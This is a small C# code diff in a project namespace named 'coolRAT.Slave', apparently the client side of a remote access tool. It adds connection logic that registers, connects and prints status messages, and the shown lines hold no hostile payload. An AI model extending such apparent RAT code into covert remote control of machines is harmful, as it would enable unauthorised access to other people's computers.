@@ -28,6 +28,16 @@ namespace coolRAT.Slave
             }
 
             Console.WriteLine($"Registered the client successfully. Authorization ticket: {clientId}");
+            Console.WriteLine("Connecting...");
+            Client c = client.CreateClient(clientId);
+            if(c == null)
+            {
+                Console.WriteLine("Failed to connect");
+                Console.ReadLine();
+                return;
+            }
+
+            Console.WriteLine("Connected!");
             Console.ReadLine();
             return;
         }
